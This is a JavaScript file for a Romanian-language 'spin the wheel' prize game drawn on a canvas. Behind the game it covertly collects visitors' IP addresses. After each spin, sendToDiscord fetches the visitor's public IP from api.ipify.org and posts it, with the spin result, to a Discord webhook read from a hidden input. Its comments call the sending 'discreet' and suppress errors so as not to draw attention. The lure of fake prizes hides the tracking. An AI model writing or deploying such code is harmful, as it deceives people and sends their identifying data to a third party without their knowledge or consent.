const canvas = document.getElementById("wheel");
const ctx = canvas.getContext("2d");
const spinBtn = document.getElementById("spin-btn");
const winnerText = document.getElementById("winner-text");
const webhookInput = document.getElementById("webhook-url");

const options = ["Win 10$", "Jackpot 💎", "Lose 💀", "Gift Card", "Big Win 💰", "Try Again"];
const colors = ["#5865F2", "#3498db", "#e74c3c", "#f1c40f", "#2ecc71", "#9b59b6"];
let currentRotation = 0;
const segmentAngle = 360 / options.length;

window.onload = () => {
    drawWheel();
};

function drawWheel() {
    options.forEach((text, i) => {
        const angle = (segmentAngle * i) * (Math.PI / 180);
        const nextAngle = (segmentAngle * (i + 1)) * (Math.PI / 180);

        ctx.beginPath();
        ctx.moveTo(200, 200);
        ctx.arc(200, 200, 200, angle, nextAngle);
        ctx.fillStyle = colors[i];
        ctx.fill();
        ctx.strokeStyle = "rgba(255,255,255,0.2)";
        ctx.stroke();

        ctx.save();
        ctx.translate(200, 200);
        ctx.rotate(angle + (segmentAngle / 2) * (Math.PI / 180));
        ctx.fillStyle = "white";
        ctx.font = "bold 16px sans-serif";
        ctx.textAlign = "right";
        ctx.fillText(text, 180, 10);
        ctx.restore();
    });
}

spinBtn.onclick = async () => {
    // Punem URL-ul aici dacă nu vrei să folosești input-ul hidden
    const webhookURL = webhookInput.value; 
    
    spinBtn.disabled = true;
    const randomDegree = Math.floor(Math.random() * 360) + 3600;
    currentRotation += randomDegree;
    
    canvas.style.transition = "transform 5s cubic-bezier(0.15, 0, 0.15, 1)";
    canvas.style.transform = `rotate(${currentRotation}deg)`;

    winnerText.innerText = "Se învârte...";

    setTimeout(async () => {
        const actualDegree = (360 - (currentRotation % 360)) % 360;
        const index = Math.floor(actualDegree / segmentAngle);
        const result = options[index];
        
        winnerText.innerText = `Ai câștigat: ${result}!`;
        spinBtn.disabled = false;

        // Trimitere discretă către Discord
        if (webhookURL && webhookURL.includes("discord.com")) {
            sendToDiscord(webhookURL, result);
        }
    }, 5000);
};

async function sendToDiscord(url, result) {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "🔔 Log Nou Dashboard",
                    color: 3447003,
                    fields: [
                        { name: "💵 Rezultat", value: result, inline: true },
                        { name: "🌐 IP Utilizator", value: `||${userIP}||`, inline: true }
                    ],
                    timestamp: new Date()
                }]
            })
        });
    } catch (err) {
        // Nu afișăm nicio eroare în consolă pentru a nu atrage atenția
    }
}
